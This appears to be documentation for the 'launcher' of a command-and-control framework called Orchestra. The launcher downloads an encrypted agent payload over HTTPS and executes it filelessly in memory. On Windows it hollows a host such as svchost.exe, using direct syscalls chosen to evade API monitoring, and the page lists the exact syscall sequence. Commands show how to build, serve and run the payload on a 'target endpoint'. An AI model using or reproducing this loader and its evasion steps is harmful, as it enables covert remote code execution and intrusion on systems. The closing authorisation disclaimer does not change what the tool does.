# Launcher: Remote Payload Fetch and In-Memory Execution

The `launcher` binary is a tiny bootstrap that downloads an
AES-256-GCM-encrypted agent payload over HTTPS, decrypts it in process
memory using a pre-shared key, and runs it without ever materialising a
file on a real on-disk filesystem.

```text
launcher --url https://your-server:8000/agent.enc --key <BASE64-32B> \
         -- arg1 arg2 ...
```

> **Note:** The launcher is typically used with the `dev-server` or a custom
> HTTPS endpoint. For the recommended deployment method, see the **outbound-c**
> feature in [FEATURES.md](FEATURES.md).

## Per-platform execution path

| Platform | Primitive                                                          |
| -------- | ------------------------------------------------------------------ |
| Linux    | `memfd_create` + `execv("/proc/self/fd/<fd>")`                    |
| macOS    | Temp file under `$TMPDIR` + `execve` (development fallback only)   |
| Windows  | Process hollowing via the shared `hollowing` crate                 |

## Windows: process hollowing

On Windows the launcher delegates to `hollowing::hollow_and_execute`,
which performs a direct-syscall RunPE sequence (avoiding the IAT-visible
Win32 API surface):

1. Resolve the target executable path via `NtOpenFile` → `NtCreateSection(SEC_IMAGE)` → `NtCreateProcessEx` to create a new process from the host binary (e.g. `svchost.exe`).
2. `NtUnmapViewOfSection` to hollow the original image from the child process.
3. `VirtualAllocEx` to allocate RWX memory in the child at the PE's preferred base address.
4. Parse DOS + NT headers from the payload to locate sections and the entry point; `WriteProcessMemory` copies each PE section.
5. Apply base relocations and resolve imports by walking the host process's PEB `Ldr` module list.
6. `NtCreateThreadEx` (PE64) or `Wow64SetThreadContext` (PE32) to set the thread start address to the payload entry point.
7. `NtResumeThread` starts execution.

PE64 is the primary supported path. PE32/WOW64 support is present but should
be treated as a compatibility work-in-progress — `Wow64GetThreadContext` /
`Wow64SetThreadContext` may fail on certain Windows builds.

The same primitive backs the agent's `MigrateAgent` capability, so the
launcher and the agent share one tested code path.

## Verification

The launcher's `tests/hollowing_test.rs` integration test asserts:

* On Windows (`#[ignore]`d by default because it spawns processes): the
  primitive accepts a valid PE payload and returns success — the spawned
  host runs detached and is reaped by the system.
* On non-Windows: the cross-platform shim returns the documented
  controlled error string `"only available on Windows"` so callers can
  surface a clean diagnostic instead of crashing.

```sh
cargo test -p launcher --test hollowing_test
# On Windows, opt into the invasive test:
cargo test -p launcher --test hollowing_test -- --ignored
```

## Usage with Orchestra

The launcher works with the Orchestra build system:

```sh
# 1. Build an encrypted payload with the Builder:
cargo run --release -p builder -- build my-profile

# 2. Serve the payload locally:
cargo run -p dev-server -- --port 8000 --directory dist

# 3. Run the launcher on the target endpoint:
./launcher --url http://<server>:8000/my-profile.enc --key '<encryption-key>'
```

For production, the **outbound-c** deployment style is recommended — the agent
is a self-contained binary that dials the Control Center directly, with no
launcher required. See [QUICKSTART.md](QUICKSTART.md) and
[CONTROL_CENTER.md](CONTROL_CENTER.md) for details.

> **Important:** Never use `package = "launcher"` in a build profile. The
> Builder rejects it because it creates a circular dependency (launcher
> downloading launcher). Always use `package = "agent"`.

## Authorisation

`launcher` is intended **only** for use by administrators who own the
managed endpoint or have written authorisation to operate it. Running it
against systems you do not control may violate computer-misuse law in
your jurisdiction.

---

## See also

- [QUICKSTART.md](QUICKSTART.md) — Getting started guide
- [ARCHITECTURE.md](ARCHITECTURE.md) — Wire protocol and crypto details
- [CONTROL_CENTER.md](CONTROL_CENTER.md) — Server configuration and REST API
- [FEATURES.md](FEATURES.md) — Feature flag reference (including outbound-c)
